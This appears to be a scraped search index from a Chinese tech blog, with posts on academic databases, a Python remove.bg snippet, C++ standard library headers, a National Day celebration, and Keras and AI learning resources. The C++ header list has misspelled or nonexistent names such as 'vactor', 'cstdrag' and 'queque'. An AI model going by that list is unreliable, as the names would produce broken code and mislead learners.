ECONLIT由美国经济学协会创办，收录了包括图书，报刊，杂志，学术论文等各种类型的文学经济学方面100多万篇文章。主要为英文资料。 XERFI网址：http://www.xerfi.com/ XERFI以学术研究为主，在这个网站可以找到各领域的研究报告。 Thèses网址：https://www.theses.fr/ 这是一个强大的论文库，无论是什么方向的论文都可以搜到一些有用的资料，还可以选择读不同学校的论文成果。 JSTOR网址：http://www.jstor.org/ 这是一个英文网站，上面有很多对于法国作品、文化或者英美文化的分析（有英文有法语），如果是研究英法双语的论文，也许可以找到相关资料。 UMI网址：http://wwwlib.umi.com/ 当需要查阅国外学位论文，可使用PQDD-B(UMI博硕士论文数据库)，它 可以获取部分全文，是很好的国外资源共享平台。 ResearchGATE 科学社交网站网址：http://www.researchgate.net ResearchGATE是全球最大的科学社交网络服务网站。于2008年5月上线，至今已经有300,000多来自196不同国家的科学家加入此共同体。 ResearchGATE针对著科学家以及研究人员提供对科研做有利的线上服务。全球的研究人员可免费注册该网站而和各种领域的同事分享研究结果或讨论专业问题。除了个人中心、科学博客等工能以外，ResearchGATE提供的应用程序随时随地毫无时空的可以分享文件，资料等。 在2009年ResearchGATE踏出了开放存取的第一步。藉由本站的开放存取自存档功能科研人员可以上载自己写作的论文以便分享研究结果。由此本网站将免费提供论文参考。搜索文件可以直接使用该站的搜寻引擎而不侵犯出版社的版权。 该站点提供的索引包括各种刊物总共有三千五百万多个登记。资料库又含有六万多篇直接可以使用的论文。特别设计的浏览特点成员抓取所有重要的对外资讯库内容，包括Pubmed, Citeseer, Arxiv, Nasa Library 等。 Engineering &amp; Science1937-1988网址：http://calteches.library.caltech.edu/ Engineering &amp; Science is a quarterly magazine, founded in 1937. Produced by the Caltech Office of Public Relations, its goal is to present to a scientifically literate audience a lively picture of the intellectual life and research activities at Caltech and to promote interest in science and scientific issues Find Articles @ BNET网址：http://findarticles.com/ Find Articles是BNET网站下属的信息检索平台，包括3000余种出版物（期刊、网站等），在列表中对免费出版物进行了标识，检索方便 ABC Chemistry 化学免费全文期刊网址：http://www.abc.chemistry.bsu.by/current/fulltext.htm ABC Chemistry是化学方面的免费全文网上期刊数据库，由白俄罗斯国立大学化学系的一位教授建立的，分为永久期刊和临时期刊两大类。 Genamics JournalSeek 期刊信息检索系统网址：http://journalseek.net/index.htm Genamics JournalSeek is the largest completely categorized database of freely available journal information available on the internet. The database presently contains 95831 titles. Journal information includes the description (aims and scope), journal abbreviation, journal homepage link, subject category and ISSN. Searching this information allows the rapid identification of potential journals to publish your research in, as well as allow you to find new journals of interest to your field. Hindawi 出版公司网址：http://www.hindawi.com/journals/ Hindawi成立于1997年，是一个高速成长的OA学术出版机构，出版200余种OA期刊，学科涵盖STM(科学、技术和医学)大部分领域。 Intel Technology Journal网址：http://www.intel.com/technology/itj/index.htm Intel Technology Journal的所有信息都由Intel(英特尔)公司提供，是提供给英特尔公司顾客的一项服务。包含有英特尔最新的研究进展信息，重点介绍英特尔公司在微处理器和计算技术方面拥有的尖端技术。此杂志每季度出版一次，由英特尔专家撰写，是一份研究与技术的参考杂志。 MIT Open Access Articles网址：http://dspace.mit.edu/handle/1721.1/49433 通过DSpace@MIT 提供麻省理工学院MIT发表的学术论文，包括原始稿，同行评议稿，最终出版的正式文档。","link":"/2019/10/04/学术网站/"},{"title":"Python实现抠图换背景","text":"曾几何时，「抠图」是一个难度系数想当高的活儿，但今天要介绍的这款神工具，只要 3 行代码 5 秒钟就可以完成高精度抠图，甚至都不用会代码，点两下鼠标就完成了。 感受下这款抠图工具抠地有多精细： 这款工具叫：Remove.bg 。基于 Python、Ruby 和深度学习技术开发，通过强大的 AI 人工智能算法实现自动识别出前景主体与背景图，分分钟秒秒钟完成抠图。这样下去PS 设计师都快要下岗了。 怎么使用这款抠图工具呢？有多种简单方式。 Python 实现安装相应的库： 1pip install removebg 在Removebg网站 上注册获取 API 后就可以使用了： 单张图： 123from removebg import RemoveBgrmbg = RemoveBg(\"WPZ2Q4fraseKfAN9PPxxxxxx\", \"error.log\") # 引号内是你获取的APIrmbg.remove_background_from_img_file(\"C:/Users/sony/Desktop/1.jpg\") #图片地址 批量图片： 1234567from removebg import RemoveBgimport osrmbg = RemoveBg(\"WPZ2Q4fraseKfAN9PPxxxxxx\", \"error.log\")path = '%s/picture'%os.getcwd() #图片放到程序的同级文件夹 picture 里面for pic in os.listdir(path): rmbg.remove_background_from_img_file(\"%s\\%s\"%(path,pic)) 网站实现Removebg网站 软件实现oneindex下载：http://pan.sqdxwz.com/?/软件/","link":"/2019/10/02/Python实现抠图换背景/"},{"title":"C++标准库和标准模板库","text":"一、C++标准库C++标准库的内容分为10类，C++标准库的内容总共在50个标准头文件中定义。 C1. 标准库中与语言支持功能相关的头文件 C2. 支持流输入/输出的头文件 C3. 与诊断功能相关的头文件 C4. 定义工具函数的头文件 C5. 支持字符串处理的头文件 C6. 定义容器类的模板的头文件 C7. 支持迭代器的头文件 C8. 有关算法的头文件 C9. 有关数值操作的头文件 C10. 有关本地化的头文件 C++标准库的所有头文件都没有扩展名。C++标准库以&lt;cname&gt;形式的标准头文件提供。在&lt;cname&gt;形式标准的头文件中，与宏相关的名称在全局作用域中定义，其他名称在std命名空间中声明。在C++中还可以使用name.h形式的标准C库头文件名。 二、算法、容器、迭代器STL（Standard Template Library，标准模板库)是惠普实验室开发的一系列软件的统称。现然主要出现在C++中，但在被引入C++之前该技术就已经存在了很长的一段时间。 STL的代码从广义上讲分为三类：algorithm（算法）、container（容器）和iterator（迭代器），几乎所有的代码都采用了模板类和模版函数的方式，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。在C++标准中，STL被组织为下面的13个头文件：&lt;algorithm&gt;、&lt;deque&gt;、&lt;functional&gt;、&lt;iterator&gt;、&lt;vector&gt;、&lt;list&gt;、&lt;map&gt;、&lt;memory&gt;、&lt;numeric&gt;、&lt;queue&gt;、&lt;set&gt;、&lt;stack&gt;和&lt;utility&gt;。 1、算法函数库对数据类型的选择对其可重用性起着至关重要的作用。举例来说，一个求方根的函数，在使用浮点数作为其参数类型的情况下的可重用性肯定比使用整型作为它的参数类性要高。而C++通过模板的机制允许推迟对某些类型的选择，直到真正想使用模板或者说对模板进行特化的时候，STL就利用了这一点提供了相当多的有用算法。它是在一个有效的框架中完成这些算法的——可以将所有的类型划分为少数的几类，然后就可以在模版的参数中使用一种类型替换掉同一种类中的其他类型。 STL提供了大约100个实现算法的模版函数，比如算法for_each将为指定序列中的每一个元素调用指定的函数，stable_sort以你所指定的规则对序列进行稳定性排序等等。这样一来，只要熟悉了STL之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要的功能并大大地提升效率。 算法部分主要由头文件&lt;algorithm&gt;，&lt;numeric&gt;和&lt;functional&gt;组成。&lt;algorithm&gt;是所有STL头文件中最大的一个（尽管它很好理解），它是由一大堆模版函数组成的，可以认为每个函数在很大程度上都是独立的，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、移除、反转、排序、合并等等。&lt;numeric&gt;体积很小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。&lt;functional&gt;中则定义了一些模板类，用以声明函数对象。 2、容器在实际的开发过程中，数据结构本身的重要性不会逊于操作于数据结构的算法的重要性，当程序中存在着对时间要求很高的部分时，数据结构的选择就显得更加重要。 经典的数据结构数量有限，但是我们常常重复着一些为了实现向量、链表等结构而编写的代码，这些代码都十分相似，只是为了适应不同数据的变化而在细节上有所出入。STL容器就为我们提供了这样的方便，它允许我们重复利用已有的实现构造自己的特定类型下的数据结构，通过设置一些模版类，STL容器对最常用的数据结构提供了支持，这些模板的参数允许我们指定容器中元素的数据类型，可以将我们许多重复而乏味的工作简化。 容器部分主要由头文件&lt;vector&gt;,&lt;list&gt;,&lt;deque&gt;,&lt;set&gt;,&lt;map&gt;,&lt;stack&gt;和&lt;queue&gt;组成。对于常用的一些容器和容器适配器（可以看作由其它容器实现的容器），可以通过下表总结一下它们和相应头文件的对应关系。 3、迭代器迭代器从作用上来说是最基本的部分，可是理解起来比前两者都要费力一些。软件设计有一个基本原则，所有的问题都可以通过引进一个间接层来简化，这种简化在STL中就是用迭代器来完成的。概括来说，迭代器在STL中用来将算法和容器联系起来，起着一种黏和剂的作用。几乎STL提供的所有算法都是通过迭代器存取元素序列进行工作的，每一个容器都定义了其本身所专有的迭代器，用以存取容器中的元素。 迭代器部分主要由头文件&lt;utility&gt;,&lt;iterator&gt;和&lt;memory&gt;组成。&lt;utility&gt;是一个很小的头文件，它包括了贯穿使用在STL中的几个模板的声明，&lt;iterator&gt;中提供了迭代器使用的许多方法，而对于&lt;memory&gt;的描述则十分的困难，它以不同寻常的方式为容器中的元素分配存储空间，同时也为某些算法执行期间产生的临时对象提供机制,&lt;memory&gt;中的主要部分是模板类allocator，它负责产生所有容器中的默认分配器。 三、后记对于STL的使用，也普遍存在着两种观点。第一种认为STL的最大作用在于充当经典的数据结构和算法教材，因为它的源代码涉及了许多具体实现方面的问题。第二种则认为STL的初衷乃是为了简化设计，避免重复劳动，提高编程效率，因此应该是“应用至上”的，对于源代码则不必深究。对于初学者而言，通过分析源代码，提高对其应用的理解其意义也不同凡响。 ========================================================= C++标准库函数 c++程序通常可以调用标准c++库中的大量函数。这些函数完成一些基本的服务，如输入和输出等，同时也为一些经常使用的操作提供了高效的 实现代码。这些函数中含有大量的函数和类定义，以帮助程序员更好地使用标准c++库。 标准c++库包含以下内容： &lt;algorithm&gt;,&lt;bitset&gt;,&lt;complex&gt;,&lt;deque&gt;,&lt;exception&gt;,&lt;fstream&gt;,&lt;functionl&gt;,&lt;iomanip&gt;,&lt;ios&gt;,&lt;iosfwd&gt;,&lt;iostream&gt;,&lt;isteam&gt;,&lt;iterat or&gt;,&lt;limits&gt;,&lt;list&gt;,&lt;locale&gt;,&lt;map&gt;,&lt;memory&gt;,&lt;numeric&gt;,&lt;ostream&gt;,&lt;queue&gt;,&lt;set&gt;,&lt;sstream&gt;,&lt;stack&gt;,&lt;stdxcept&gt;,&lt;streambuf&gt;,&lt;strin ig&gt;,&lt;strstream&gt;,&lt;utility&gt;,&lt;valarray&gt;,&lt;vactor&gt;,&lt;cassert&gt;,&lt;cctype&gt;,&lt;cerron&gt;,&lt;cfloat&gt;,&lt;ciso646&gt;,&lt;climits&gt;,&lt;clocale&gt;,&lt;cmath&gt;,&lt;cse tjmp&gt;,&lt;csignal&gt;,&lt;cstdrag&gt;,&lt;cstddef&gt;,&lt;cstdio&gt;,&lt;cstdlibn&gt;,&lt;cstring&gt;,&lt;ctime&gt;,&lt;cwchar&gt;,&lt;iso646.h&gt;和&lt;cwchar.h&gt; 标准c++库的详细消息均在其对应的头文件进行了说明。主要标准c++库头文件如下所示。其中13项为标准模板库（STL),在其说明文字的前面标有（STL)的为标准模板库。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139&lt;algorithm&gt;---（STL）用于定义实现常用、实用算法的大量模板&lt;bitset&gt;----- 用于定义官位位集合的模板类&lt;cassert&gt;-----用于在程序执行时执行断言&lt;cctype&gt;-----用于对字符进行分类&lt;cerrno&gt;-----用于测试有库函数提交的错误代码&lt;cfloat&gt;------用于测试浮点类型属性&lt;cios646&gt;----用于在ISO646变体字符集中编程&lt;climits&gt;-----用于测试整数类型属性&lt;clocale&gt;-----用于使程序适应不同的文化风俗&lt;cmath&gt;———用于计算常用的数学函数&lt;complex&gt;-----用于定义支持复杂算法的模板类&lt;csetjmp&gt;-----用于执行非局部的goto语句&lt;csignal&gt;------用于控制各种异常情况&lt;cstdrag&gt;-----用于访问参数数量文化的函数&lt;cstdarg&gt;-----用于访问参数数量变化的函数&lt;cstddef&gt;----用于定义实用的类型和宏&lt;cstdio&gt;-----用于执行输入和输出&lt;cstdlib&gt;----用于执行同一操作的不同版本&lt;string&gt;-----用于处理几种不同的字符串类型&lt;ctime&gt;------用于在几种不同的时间和日期格式间进行转换&lt;cwchar&gt;----用于处理宽流（wide stream)和字符串&lt;cwctype&gt;---用于对宽字符（wide character是）分类&lt;deque&gt;---(STL)用于定义实现双向队列容器的模板类&lt;exception&gt;---用于定义控制异常处理的几个函数&lt;fstream&gt;-----用于定义处理外部文件的几个iostream模板类&lt;functional&gt;-----（STL)用于定义几个模板，该模板将帮助在&lt;algorithm&gt;和&lt;numeric&gt;中定义的 模板构造谓词&lt;iomapip&gt;---- 用于声明一个带有参数的iostreams控制器&lt;ios&gt;-----用于定义用作大量iostreams类的基类的模板类&lt;iosfwd&gt;-----用于定义iostreams模板类（在需要定义之前）&lt;iostream&gt;---用于声明处理标准流的iostreams对象&lt;istream&gt;---用于定义执行析取操作的模板类&lt;iterator&gt;----（STL)用于定义帮助定义和管理迭代器的模板&lt;limits&gt;---用于测试数字类属性&lt;list&gt;---（STL)用于定义实现list容器的模板类&lt;locale&gt;----用于定义在iostreams类中控制与特定位置相关的行为的类和模板&lt;map&gt;------(STL)用于定义实现关联容器的模板类&lt;memoery&gt;-----（STL)用于定义对不同容器分配和释放内存的模板&lt;numeric&gt;-----（STL)用于定义实现实用数字函数的模板&lt;ostream&gt;----用于定义管理字符串容器的iostreamas模板类&lt;queque&gt;----(STL)用于实现队列容器的模板类&lt;set&gt;-----（STL)用于定义实现只有唯一元素的关联容器的模板类&lt;sstream&gt;----用于定义管理字符串容器的iostreams模板类&lt;stack&gt;-----（STL)用于定义实现堆栈容器的模板类&lt;stdexcept&gt;----用于定义提交异常的类&lt;streambuf&gt;----用于定义为iostreams操作分配缓冲区的模板类&lt;string&gt;------用于定义是实现字符串容器的模板类&lt;strstream&gt;-----用于定义处理非内存（in-memory)字符系列的iostreams类&lt;utility&gt;-----（STL)用于定义通用工具的模板&lt;valarray&gt;----用于定义支持值（value-oriented）数组的类和模板类&lt;vector&gt;----（STL)用于定义实现向量容器的模板类标准c++库还包括18个标准C库中的头文件，但其中有些变化。我们暂时不讨论，这些头文件为：====================&lt;assert.h&gt;---用于在程序运行时执行断言&lt;ctype.h&gt;----用于对字符分类&lt;errno.h&gt;----用于测试用库函数提交的错误代码&lt;float.h&gt;----用于测试浮点类型属性&lt;ios646.h&gt;-----用于在IOS646变体字符集中编程&lt;limits.h&gt;-----用于测试整数类型属性&lt;locale.h&gt;-----用于适应不同的文化习俗&lt;math.h&gt;----用于计算常见的数学函数&lt;setjmp.h&gt;----用于执行非局部的goto语句&lt;signal.h&gt;----用于控制各种异常情况&lt;stdrag.h&gt;-----用于访问参数数量变化的函数&lt;stddef.h&gt;-----用于定义类型和宏&lt;stdio.h&gt;------用于执行输入和输出&lt;stdlib.h&gt;------用于执行各种操作&lt;string.h&gt;-----用于处理字符串&lt;time.h&gt;-------用于在不同的时间和日期格式之间转换&lt;wchar.h&gt;-----用于处理宽流(wide stream)和字符类&lt;wctype.h&gt;-----用于对宽字符（wide character）分类","link":"/2019/10/02/C-标准库和标准模板库/"},{"title":"我的祖国，我的家，七十周年快乐","text":"这盛世，如您所愿。 1949—2019，一路披荆斩棘的中华人民共和国，终于在盛世中迎来了她的70大寿。 犹记得，70年前，毛主席在天安门层楼上的庄严宣告：中华人民共和国成立了！ 也欣喜，70年来，中华人民共和国在披荆斩棘中蒸蒸日上，屹立于世界的东方。 9月29日：共和国勋章首次颁授9月29日，国庆活动第一弹——中华人民共和国国家勋章和国家荣誉称号颁授仪式在人民大会堂举办。这是现行宪法公布施行以来第一次集中颁授，颁授的国家勋章包括“共和国勋章”和“友谊勋章”两种。 9月30日：向人民英雄敬献花篮仪式9月30日是国家设立的烈士纪念日，在中华人民共和国成立七十周年的之际，习近平等党和国家领导人将同各界代表在天安门广场向人民英雄敬献花篮。 10月1日：阅兵和群众游行、首都国庆联欢活动、文艺晚会1.阅兵和群众游行 阅兵 庆祝中华人民共和国成立70周年阅兵，编59个方（梯）队和联合军乐团，总规模约1.5万人，各型飞机160余架、装备580台套，是近几次阅兵中规模最大的一次。领导指挥方队、院校科研方队和文职人员方队将在此次阅兵中首次亮相，这也将会成为朱日和沙场阅兵和海上专项阅兵后，最大规模的新型武器和无人装备的首次集中受阅，东风-41等新型装备也有望亮相。 受阅将军人数超过以往，是历史上高级指挥员受阅数量最多的一次。两名女将军将担任女兵方队的领队，这是历次阅兵中首次在徒步方队安排女将军受阅。阅兵现场演奏曲目达50多首，是历次国庆活动中最多的一次。 2.首都国庆联欢活动首都国庆联欢活动包括主题表演、中心联欢表演、群众联欢、烟花表演和表演台表演五部分。 主题表演由3290名联欢群众手持光影屏和表演道具进行组图、立体呈现。 中心联欢表演共有3650人参加联欢，主要展示各地特色群众文化，选用了近40首为群众喜爱的经典歌曲，其中精选《我和我的祖国》等16首歌曲由全场联欢群众合唱。 群众联欢设立10个群众联欢区块，各自进行区域性自主联欢。同时，还将与主题表演、中心联欢表演进行融合表演。 烟花表演将通过高空、中空，低空烟花燃放和特殊烟花装置表演分波次、多新意地燃放烟花。 表演台表演由16支交响乐团1028人组成千人交响乐团，北京市大中小学校学生1400人组成千人合唱团。 3.文艺晚会除了国家统一的活动，各地也纷纷举办庆祝活动。 感受十月一日，国庆，一个不同寻常的一天。今天心情激动的我也是早早的起床，一直等待着阅兵式，不管怎么说，虽然我不能到达现场，却透过屏幕感受到了大家的自豪。 上午十点钟，阅兵正式开始： 领导人和各代表出场，一出场便是满满的感动，曾经我们印象中满头黑发的胡锦涛总书记，温家宝总理如今已双鬓发白，您容颜苍老，在我们心中显得却是更加的高大。 今天，我们的习大大在全国人民，全世界的瞩目下庄严的宣告： http://t.cn/AimL9ZDx?m=4422528170377121&amp;u=2656274875 您在党旗，国旗，军旗下的注目，是您心中不忘初心，砥砺前行的勇气的展现。 今年的阅兵也是拥有了前所未有的展现： 1．首次组建领导指挥方队接受检阅2．仪仗方队首次同时高擎党旗国旗军旗经过天安门接受检阅，也是仪仗方队历次参阅规模最大的一次3．火箭军方队首次以战略军种名义亮相国庆阅兵4．战略支援部队方队首次亮相国庆阅兵5．联勤保障部队方队是军队调整改革后首次亮相6．女兵方队首次以挂枪形式，全新混合编组参加国庆阅兵，这也是武警部队女兵首次参加国庆阅兵。7．院校科研方队平均学历最高，首次亮相国庆阅兵8．文职人员方队首次亮相阅兵盛典…. 一个一个的首次点燃的是我们内心的自豪，此生无悔入华夏，来世还做中国人，是我们内心最真挚的呼唤。 今天除了阅兵场的气势磅礴，我也感受到了国人的热情，我身边同学，朋友…我的朋友圈，空间，甚至是我的APP软件推送的展示的都令我感到自豪感到兴奋，我的朋友圈，空间从来没有像今天一样的”整齐”，一样的”约定俗成”：”山河犹在，国泰民安，这盛世，如您所愿”，”国之繁荣，盛世鼎立”…或许这就是所谓的爱国情，自豪感。 H5客户端观看人数达到一亿二千万人，微博客户端观看达到九千万人，这些数字都深深的震撼着我。 直到今天，我们仍然对得起先辈们当初的抛头颅，洒热血，英雄的血不会白流，祖国的心永远炙热。我们爱您，祖国母亲！九万里风鹏正举，唤我辈少年心存民族兴、国家强、舍我其谁的宏愿和担当。美哉，我少年中国与天不老!壮哉，我中国少年与国无疆!泱泱中华继炎黄，恰似江河淮济命脉长，普天华夏儿女兴家邦，我巍巍中华，矞矞皇皇，屹立东方!","link":"/2019/10/01/我的祖国，我的家，七十周年快乐/"},{"title":"Keras学习资源","text":"Keras简介Keras是Python中以CNTK、Tensorflow或者Theano为计算后台的一个深度学习建模环境。 相对于其他深度学习的框架，如Tensorflow、Theano、Caffe等，Keras在实际应用中有一些显著的优点，其中最主要的优点就是Keras已经高度模块化了，支持现有的常见模型（CNN、RNN等），更重要的是建模过程相当方便快速，使用Keras可以快速地搭建深度网络，极大的加快了开发速度。此外，Keras具有用户友好性、模块化、易扩展、与Python协作友好的特点。 Keras学习手册 Keras官方手册，非常详细的官方文档，文档中详细的介绍了从Keras每个知识点的用法，一步步带你从入门到精通。https://keras.io/ Keras中文官方手册，该中文官方手册是对对Keras英文官方手册最好的还原，适合所有阶段的Keras学习者阅读。https://keras.io/zh/ Keras中文文档，另一个非官方的Keras中文文档，笔者花了近两年的时间在维护，文档也一直在更新，包含ConvLSTM2D、SimpleRNNCellKeras、GRUCell等最新的内容，非常用心的一份Keras文档。https://keras-cn.readthedocs.io/en/latest/ 安装Keras库进行深度学习，国外一篇比较火的博客，旨在演示如何安装Keras库进行深度学习。http://www.pyimagesearch.com/2016/07/18/installing-keras-for-deep-learning/ 黄海广博士力荐的Keras github项目，这个github的repository主要是博主在学习Keras的一些记录及练习，满满都是干货，建议大家看一下。https://github.com/erhwenkuo/deep-learning-with-keras-notebooks 磐创AI Keras系列教程总结，从CNN到RNN，以入门、基础为主的讲解，适合小白学习。http://www.keraschina.com Keras学习视频 Waterloo大学关于Keras的课程，该视频在YouTube上有很高的播放率，课程质量非常高https://www.youtube.com/watch?v=Tp3SaRbql4k CERN使用Keras进行深度学习系列教程，比较详细、权威的一个Keras系列教程视频。http://cds.cern.ch/record/2157570?ln=en 莫烦Keras视频教程，莫烦老师的视频在B站、YouTube上都有很高的播放量，强烈推荐给大家。https://www.bilibili.com/video/av16910214/ 再为大家推荐YouTube上另一个大佬Sentdex的Keras教学视频，还配套有相应的文本教程和笔记。https://www.youtube.com/watch?v=wQ8BIBpya2k https://pythonprogramming.net/introduction-deep-learning-python-tensorflow-keras/ Keras代码案例Keras&amp;NLP代码案例 用LSTM在IMDB影评数据集做文本分类https://github.com/fchollet/keras/blob/master/examples/imdb_lstm.py 路透社主题分类https://github.com/fchollet/keras/blob/master/examples/reuters_mlp.py LSTM做文本生成https://github.com/fchollet/keras/blob/master/examples/lstm_text_generation.py 在IMDB数据集上使用FastTexthttps://github.com/fchollet/keras/blob/master/examples/imdb_fasttext.py 基于LSTM的BABI数据集网络https://github.com/kerasteam/keras/blob/master/examples/reuters_mlp.py 预训练词向量https://github.com/kerasteam/keras/blob/master/examples/pretrained_word_embeddings.py 字符级卷积神经网络做文本分类https://github.com/johnb30/py_crepe LSTM预测一个人的性别https://github.com/divamgupta/lstm-gender-predictor Keras&amp;CV代码案例 使用CNN进行MNISThttps://github.com/fchollet/keras/blob/master/examples/mnist_cnn.py Inception V3https://github.com/fchollet/keras/blob/master/examples/inception_v3.py VGG16https://gist.github.com/baraldilorenzo/07d7802847aaad0a35d3 FractalNethttps://github.com/snf/keras-fractalnet 可视问答https://github.com/avisingh599/visual-qa VGG-CAMhttps://github.com/tdeboissiere/VGG16CAM-keras ResNet 50https://github.com/keras-team/keras/pull/3266/files 对象分割https://github.com/abbypa/NNProject_DeepMask fcn、segnet、u-net等常用的图像分割模型https://github.com/divamgupta/image-segmentation-keras Keras项目 RocAlphaGo，这个项目是DeepMind 2016年《自然》杂志的一个学生主导的实施项目，使用了Python+keras实现，代码清晰性更好。https://github.com/Rochester-NRT/RocAlphaG BetaGo，项目是使用keras的深度学习Go机器人。https://github.com/maxpumperla/betago DeepJazz，使用Keras深度学习驱动的爵士乐生成系统。https://github.com/jisungk/deepjazz dataset-sts，语义文本相似度数据集集线器。https://github.com/brmson/dataset-sts NMT-Keras，利用球面进行神经机器翻译。https://github.com/lvapeab/nmt-keras Headline generator，利用循环神经网络独立生成新闻标题的实现。https://github.com/udibr/headlines","link":"/2019/09/30/Keras学习资源/"},{"title":"人工智能中的数学知识","text":"机器学习和深度学习中所用的数学知识主要来自以下几门课： 高等数学/微积分 线性代数与矩阵论 概率论与信息论 最优化方法 图论/离散数学 总体来说需要如下知识点，这些知识点一般都是CS&amp;EE专业在大一和大二必修和选修的课程，大家可以查漏补缺。 1.1 微积分 函数极限 上确界与下确界 导数与偏导数 单调性与极值 函数的凹凸性 泰勒级数 牛顿-莱布尼兹公式 Lipschitz连续性 Hessian矩阵 1.2 线性代数与矩阵运算 线性空间与线性映射 行列式求解 常见的矩阵运算 特征值与特征向量 广义特征值 奇异值分解 1.3 概率论与数理统计 概率空间与事件 独立性与条件概率 贝叶斯公式 随机变量与概率公式 大数定理与中心极限定理 Jensen不等式 常见的概率分布 协方差 参数估计：矩估计/极大似然估计/区间估计 随机算法 信息论基础 1.4 最优化方法 凸优化介绍，凸函数与凸集合 拉格朗日乘数法与KKT条件 常见的凸优化问题 1.5 图论 图概念 常见的图 路径搜索问题 最大流问题 拉普拉斯矩阵","link":"/2019/09/30/人工智能中的数学知识/"},{"title":"AI学习资料","text":"国外课程斯坦福公开课程：概率和统计课程名称：《Probability and Statistics》 学习地址：https://online.stanford.edu/courses/gse-yprobstat-probability-and-statistics MIT 公开课线性代数课程名称：《Linear Algebra》 讲师：Gilbert Strang 学习地址：https://ocw.mit.edu/courses/mathematics/18-06-linear-algebra-spring-2010/ 斯坦福 2017 季 CS231n 深度视觉识别课程视频课程名称：《Convolutional Neural Networks for Visual Recognition》 讲师：Fei-Fei Li、Justin Johnson、Serena Yeung 国外学习地址：https://www.youtube.com/playlist?list=PLzUTmXVwsnXod6WNdg57Yc3zFx_f-RYsq 国内学习地址：https://www.bilibili.com/video/av13260183/ Fastai 推出的【2019 年面向程序员的深度学习实战课程】课程名称：《Practical Deep Learning for Coders, v3》 讲师：Jeremy Howard 国外学习地址：https://course.fast.ai 国内学习地址：https://www.bilibili.com/video/av41718196/ 2019 斯坦福CS224n深度学习自然语言处理课程课程名称：《CS224n: Natural Language Processing with Deep Learning》 讲师：Chris Manning 国外学习地址：https://www.youtube.com/playlist?list=PLU40WL8Ol94IJzQtileLTqGZuXtGlLMP_ 国内学习地址：https://www.bilibili.com/video/av46216519/ 斯坦福机器学习课程课程名称：《Machine Learning（Coursera）》 讲师：Andrew Ng 学习地址：https://www.coursera.org/learn/machine-learning 斯坦福概率图模型专项课程课程名称：《Probabilistic Graphical Models Specialization(Coursera)》 讲师：Daphne Koller 学习地址：https://www.coursera.org/specializations/probabilistic-graphical-models DeepMind 强化学习导论课程课程名称：《Introduction to Reinforcement Learning》 讲师：David Silver 国外学习地址：https://www.youtube.com/playlist?list=PLqYmG7hTraZDM-OYHWgPebj2MfCFzFObQ 国内学习地址：https://www.bilibili.com/video/av24060851/ 全栈深度学习训练营(课程视频)：为熟悉深度学习基础知识的开发人员提供的实践指导课程课程名称：《Full Stack Deep Learning Bootcamp》 Github 地址：https://github.com/full-stack-deep-learning/fsdl-text-recognizer-project 国外学习地址：https://fullstackdeeplearning.com/march2019 国内学习地址：https://www.bilibili.com/video/av49643298 跟顶级Kagglers学习如何赢取数据科学竞赛课程名称：《How to Win a Data Science Competition: Learn from Top Kagglers（Coursera）》 讲师：Dmitry Ulyanov、Alexander Guschin、Mikhail Trofimov、Dmitry Altukhov、Marios Michailidis 学习地址：https://www.coursera.org/learn/competitive-data-science CS188 伯克利《人工智能导论》课程，含视频+资料课程名称：《BerkeleyX: CS188.1x Artificial Intelligence》 国外学习地址：https://inst.eecs.berkeley.edu/~cs188/fa18/ 国内学习地址：https://www.bilibili.com/video/av39489278/ Fast.ai 发布的课程：从零开始学深度学习课程名称：《Deep Learning from the Foundations》 讲师：Jeremy Howard 学习地址：https://www.fast.ai/2019/06/28/course-p2v3/ CS230 斯坦福深度学习课程（2018 年秋）课程名称：《CS230: Deep Learning | Autumn 2018》 讲师：Andrew Ng、Kian Katanforoosh 国外学习地址：https://www.youtube.com/playlist?list=PLoROMvodv4rOABXSygHTsbvUz4G_YQhOb 国内学习地址：https://www.bilibili.com/video/av47055599/ deeplearning.ai 上线的 TensorFlow 实践课程，面向使用 TensorFlow 的开发者课程名称：《TensorFlow in Practice》 讲师：Andrew Ng 学习地址：https://www.deeplearning.ai/tensorflow-in-practice/ UC Berkeley《动手学深度学习》，李沐新书配套课程课程名称：《Dive into Deep Learning》 讲师：Alex Smola、Mu Li 学习地址：https://www.youtube.com/playlist?list=PLZSO_6-bSqHQHBCoGaObUljoXAyyqhpFW MIT的Python机器学习课程课程名称：《Machine Learning with Python-From Linear Models to Deep Learning》 学习地址：https://www.edx.org/course/machine-learning-with-python-from-linear-models-to-deep-learning 斯坦福 CS224U 自然语言理解课程课程名称：《CS224U：Natural Language Understanding》 学习地址：http://web.stanford.edu/class/cs224u/index.html 国内顶尖大学的计算机课程:中国科学技术大学课程资源课程名称：《USTC-Course》 Github 地址：https://github.com/USTC-Resource/USTC-Course 浙江大学Github 地址：https://github.com/QSCTech/zju-icicles 清华大学课程Github 地址：https://github.com/PKUanonym/REKCARC-TSC-UHT 北京大学课程Github 地址：https://github.com/lib-pku/libpku 台湾老师的课程陈蕴侬应用深度学习课程名称：《107 Spring - Applied Deep Learning, Taiwan University》 讲师：Yun-Nung (Vivian) Chen 学习地址：https://www.bilibili.com/video/av46656764/https://www.csie.ntu.edu.tw/~miulab/s107-adl/ 台大林轩田老师《机器学习基石》课程课程名称：《机器学习基石》 讲师：林轩田 学习地址：https://www.bilibili.com/video/av12463015/ 台大林轩田老师课程课程名称：《机器学习技法》 讲师：林轩田 学习地址：https://www.bilibili.com/video/av12469267/ NTU 大学，李宏毅最新机器学习课程（2019）课程名称：《Machine Learning》 讲师：李宏毅 学习地址：http://speech.ee.ntu.edu.tw/~tlkagk/courses_ML19.html","link":"/2019/09/29/AI学习资料/"},{"title":"人工智能，机器学习，数据挖掘","text":"说到人工智能(AI)的定义，映入脑海的关键词可能是“未来”，“科幻小说”，虽然这些因素看似离我们很遥远，但它却是我们日常生活的一部分。语音助手的普及、无人驾驶的成功，人工智能、机器学习、深度学习已经深入我们生活的各个场景。例如京东会根据你的浏览行为和用户的相似性，利用算法为你推荐你需要的产品；又比如美颜相机，会基于你面部特征的分析，通过算法精细你的美颜效果。还有众所周知的谷歌DeepMind，当AlphaGo打败了韩国职业围棋高手Lee 